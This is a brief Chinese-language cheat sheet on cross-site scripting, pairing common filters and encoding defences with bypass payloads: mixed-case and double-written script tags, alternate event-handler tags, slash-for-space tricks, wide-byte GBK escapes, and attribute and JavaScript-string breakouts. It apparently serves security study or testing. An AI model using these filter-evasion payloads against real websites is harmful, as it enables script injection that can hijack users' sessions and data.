# XSS：常见防御与绕过
## 1. 关键词与标签过滤
**常见防御**：过滤 `script`、`onxxx` 事件、`javascript:` 伪协议。
**绕过**：大小写 `<sCrIpT>`；换标签 `<svg/onload=>`、`<details/ontoggle=>`、`<video><source onerror=>`；HTML5 `<iframe srcdoc="&lt;script&gt;...">`；双写 `<scrscriptipt>`。
## 2. 空格与特殊字符过滤
**常见防御**：过滤空格、引号、点号、分号。
**绕过**：用 `/` 代替空格 `<img/src/onerror=>`；tab、回车、`/**/`；`window['location']` 代替 `window.location`；`String.fromCharCode()` 或十六进制代替引号内字符。
## 3. 输入编码与实体化
**常见防御**：将 `<` `>` `"` 转义为 `&lt;` `&gt;` `&quot;`。
**绕过**：宽字节(GBK) `%df` 吃转义；DOM 型若经 `innerHTML`/`eval()` 还原则仍可 XSS。
## 4. 上下文
- 在 HTML 标签内：直接 `<script>` 或事件标签
- 在属性内：闭合属性 `" onfocus=alert(1) "` 或 `' onerror=...'`
- 在 JS 字符串内：闭合引号 `';alert(1);//` 或 `\`;alert(1);//`
